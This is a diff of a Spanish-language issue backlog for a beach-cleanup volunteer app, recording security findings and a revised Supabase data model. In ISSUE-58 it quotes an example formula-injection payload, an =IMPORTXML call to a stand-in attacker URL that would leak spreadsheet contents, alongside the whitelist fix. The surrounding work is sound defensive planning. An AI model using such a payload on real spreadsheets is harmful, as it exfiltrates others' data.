@@ -508,27 +508,69 @@
 
 ### `[ISSUE-58]` 🔴 Inyección de fórmulas en Google Sheets — latente, corregir antes de ISSUE-27
 * **Hallazgo:** el conector actual no funciona (lee `vista_reporte_jornadas`, que ya no existe, con la clave pública), pero cuando se rehaga y copie nombres, motivos de omisión, encargado de pesaje o N° de guía con `setValues()`, un texto que empiece con `=` se ejecutará como fórmula. Ej.: un "voluntario" `=IMPORTXML("https://atacante…?"&A1:Z99)` enviaría el contenido de la planilla a un tercero. Con ISSUE-57 cualquiera puede inyectar ese texto.
+> **Decisiones del 13-11-2026:** en vez de vetar solo los símbolos iniciales, cada campo de texto libre acepta **solo sus caracteres permitidos** (lista blanca), con el mismo criterio en la app (error bajo el campo, no deja avanzar), en `ValidadorJornada` y en la RPC:
+> - **Nombres** (líder, voluntarios, encargado de pesaje): letras (con tildes, ñ, ü), espacios y apóstrofo; empieza con letra; máx. 80.
+> - **Motivo de omisión de foto:** letras, números y espacios; empieza con letra o número; máx. 120.
+> - **N° de guía de despacho:** letras, números y guion; empieza con letra o número; 1 a 12 caracteres (ver ISSUE-60).
 * **Criterios de aceptación:**
-  - [ ] RPC: rechazar textos libres (nombres, `encargado_pesaje`, `nro_guia_despacho`, `motivo_omision_*`) que empiecen con `=`, `+`, `-`, `@`, tabulador o retorno de carro; misma regla en `ValidadorJornada` y en los campos de la app.
+  - [ ] RPC, `ValidadorJornada` y campos de la app con la misma lista blanca por campo.
   - [ ] Conector (ISSUE-27): anteponer `'` a todo texto antes de `setValues()`.
 
 ### `[ISSUE-59]` 🟠 ID de jornada corto: fotos públicas adivinables y suplantación de jornadas
 * **Hallazgo:** el sufijo del ID son 6 caracteres hexadecimales de un UUID (`JornadaFlujoViewModel.kt`, `UUID.randomUUID().toString().take(6)`): ~16,7 millones de combinaciones por día. Las fotos (pueden mostrar caras, Ley 21.719 — ISSUE-40) son públicas en `…/REG-AAAAMMDD-XXXXXX_{1|2|3}_{tipo}.jpg`. Riesgos: (a) recorrer URLs por fuerza bruta; (b) **adelantarse a una jornada real**: si alguien sube antes una jornada o una foto con ese ID, la real recibe `YA_EXISTIA` / "ya existe", se marca sincronizada y sus datos se pierden en silencio.
+> **Decisiones del 13-11-2026:** 12 caracteres hexadecimales del UUID. `insertJornada` pasa de `REPLACE` a `ABORT` (un `REPLACE` borra la fila y, en cascada, sus participantes, herramientas y conteos); si el ID ya existe se genera otro (hasta 3 intentos).
 * **Criterios de aceptación:**
   - [ ] Sufijo de 12 caracteres (~281 billones de combinaciones); el formato `[A-Z0-9]{4,12}` de la RPC, del bucket y de `ValidadorJornada` ya lo acepta.
+  - [ ] `insertJornada` con `ABORT` y reintento con otro ID.
   - [ ] De fondo (ISSUE-40): bucket privado con URLs firmadas.
 
 ### `[ISSUE-60]` 🟠 Llenado de la base de datos con la clave pública
 * **Hallazgo:** `jornada_rechazada` acepta hasta 5.000 rechazos sin resolver de hasta 100 KB cada uno (`c_max_payload`): ~500 MB, todo el plan gratuito. Las jornadas válidas no tienen tope. Un payload real pesa 1–5 KB.
+> **Decisiones del 13-11-2026:** `c_max_payload` 20 KB y `c_max_pendientes` 1.000 (peor caso ~20 MB). `nro_guia_despacho` era el único texto libre sin tope: máx. 12 caracteres (letras, números y guion).
 * **Criterios de aceptación:**
-  - [ ] Bajar `c_max_payload` a ~20 KB y agregar un tope total de tamaño de `jornada_rechazada`.
-  - [ ] Evaluar un tope de jornadas por día (o por brigada y día) en la RPC.
+  - [ ] `c_max_payload` = 20 KB y `c_max_pendientes` = 1.000.
+  - [ ] `nro_guia_despacho` de 1 a 12 caracteres en la app y la RPC.
+  - [ ] 📝 Anotado: evaluar un tope de jornadas por día (o por brigada y día) en la RPC.
 
 ### `[ISSUE-61]` 🟡 Hallazgos menores de seguridad — anotados
 * La RPC responde `YA_EXISTIA`: permite saber si un ID existe (no revela sus datos).
 * Las fotos y los datos (nombres, GPS) quedan en el teléfono después de sincronizar; protegidos por el sandbox de Android, pero nunca se borran. Evaluar borrar las fotos locales tras subirlas.
 * `SECURITY DEFINER` con `search_path = public`; lo recomendado es `pg_catalog, public` (riesgo mínimo: `anon` no puede crear objetos).
 * Informativo: `gradle.properties` incluye una ruta con el nombre de usuario (ya en ISSUE-28); `proguard-rules.pro` apunta a un paquete inexistente (`data.remote.dto`): si se activa la minificación, la sincronización con Gson fallaría.
+
+## 🧱 Épica 11: Modelo de datos v5 (análisis del 13-11-2026)
+
+> **Criterio de la clienta/desarrollador:** todo dato que se servirá en la planilla, una web o informes vive en tablas con su PK y FK; lo derivado (nombres, listas, totales) se entrega en vistas, no como copias en `jornada`.
+
+### `[ISSUE-62]` Modelo v5 en Supabase: brigadas por playa, sectores y fotos en tablas, tipos exactos · ~1,5 d
+* **Hallazgos:** los sectores de una jornada eran un arreglo `TEXT[]` sin FK; las brigadas, un `CHECK` fijo en el SQL y la app; kg y km en `REAL` (float de 32 bits: `20.1 + 9.3 = 29.399999`); horas en milisegundos (`BIGINT`); GPS sin lectura guardado como (0, 0) (un punto en el golfo de Guinea); fotos como 6 columnas con la URL completa y sin amarrar cada URL a su tipo.
+* **Decisiones del 13-11-2026:**
+  - `brigada_catalogo` (`id_brigada`, `id_playa` FK, `nombre_brigada`, `is_activo`): cada playa tiene sus brigadas. En la P2 se elige **primero la playa** y luego aparecen sus brigadas. Semilla: PLAYA-01 con Brigadas A–D.
+  - `jornada_sector` (`id_registro`, `id_sector`, `area_m2` del momento) **solo en Supabase**; Room sigue con su lista local.
+  - `foto_jornada` (`id_registro`, `tipo`, `ruta` o `motivo_omision`): guarda la **ruta** dentro del bucket (`REG-…_1_inicio.jpg`), no la URL; la RPC exige la ruta exacta de cada tipo. Con el bucket público la URL se arma con la ruta (sirve para `=IMAGE()` en Sheets o una página); con bucket privado (ISSUE-40), para URLs firmadas.
+  - Se quitan de `jornada` las copias derivadas (`nombre_playa`, `nombre_lider`, `voluntarios_csv`, `total_participantes`, `sectores_csv`, `area_total_m2`): las entrega `vista_jornada` (solo con la clave secreta).
+  - `NUMERIC` para kg (7,2) y km (5,2); `kg_totales` columna generada; horas en `TIMESTAMPTZ` (la app sigue enviando milisegundos y la RPC convierte).
+  - Coordenada inicial `NULL` cuando no hubo lectura de GPS (también en Room).
+  - Índices para las FK y la consulta del inventario: `herramienta_jornada(qr_codigo)`, `jornada(id_playa)`, `jornada(id_brigada)`, `basura_recolectada(id_tipo_basura)`, `jornada_sector(id_sector)`, `brigada_catalogo(id_playa)`.
+  - Reinstalación destructiva (`supabase_reset.sql` + esquema) y Room v7 destructiva: aún no hay datos reales.
+
+### `[ISSUE-63]` Política única de catálogos: "lo que no viene del servidor queda inactivo" · 0,25 d
+* **Hallazgo:** playas y sectores se reemplazaban (se borraba lo que el servidor ya no enviaba) y herramientas y tipos de residuo solo se agregaban; un `DELETE` hecho a mano en Supabase dejaba al teléfono ofreciendo algo que la RPC rechaza.
+* **Decisión del 13-11-2026:** `is_activo` solo decide qué se muestra en la app; los datos se quedan en la base. Al descargar los catálogos, lo que no viene del servidor se marca inactivo en el teléfono (nunca se borra, para no romper las FK de jornadas locales); si vuelve a venir, se reactiva.
+
+### `[ISSUE-64]` GPS en alta precisión · 0,1 d
+* **Hallazgo:** `PRIORITY_BALANCED_POWER_ACCURACY` se ubica sobre todo por Wi-Fi y antenas (~100 m) y casi no enciende el GPS; como se descartan las lecturas peores que 35 m, en una playa sin Wi-Fi ni datos la jornada probablemente quedaba con 0 km y sin coordenada. El GPS no necesita internet (sin datos solo tarda más la primera posición).
+* **Decisión del 13-11-2026:** `PRIORITY_HIGH_ACCURACY`. ⚠️ Medir la batería en el piloto (ISSUE-29, meta < 5 % en 3 h).
+
+### `[ISSUE-65]` 📝 Encargado de pesaje no verificado contra los participantes — con las cuentas (ISSUE-38)
+* Ni la app ni la RPC comprueban que `encargado_pesaje` sea uno de los participantes (ISSUE-19). Se resuelve más adelante, cuando existan cuentas.
+
+### `[ISSUE-66]` 📝 Jornada con foto local perdida: sin salida — anotado
+* Si el archivo de una foto se pierde antes de sincronizar, la jornada queda en `ERROR_SYNC` y "Reintentar" falla siempre (ya no se puede omitir la foto con un motivo). Evaluar permitir, desde Reportes, convertir esa foto en omitida con motivo.
+
+### Riesgos aceptados (13-11-2026)
+* Una jornada pendiente más de 60 días se rechaza para siempre (fecha fuera de rango): se acepta que se pierda.
+* Sin sincronización automática (ISSUE-37), los datos solo salen al abrir la P1 con internet; si se pierde el teléfono se pierden las no sincronizadas: se acepta por ahora.
 
 ---
 
@@ -543,6 +585,7 @@
 | 5 | ✅ ISSUE-24 → 25 → 26 | 2,25 d |
 | 6 | ISSUE-41 ✅ (UI P1), ISSUE-42 → 28 → 29 | 3,5 d |
 | 6b | Seguridad antes del piloto: ISSUE-59, ISSUE-60, ISSUE-58 (parte RPC); luego ISSUE-57 vía ISSUE-38 | ~1 d |
+| 6c | Modelo v5: ISSUE-62 → 63 → 64 | ~2 d |
 | 7 | ISSUE-37, ISSUE-27 (Sheets), ISSUE-38, ISSUE-43 (catálogos, por decidir) | 1,75 d |
 | **Total** | | **≈ 16 días** |
 
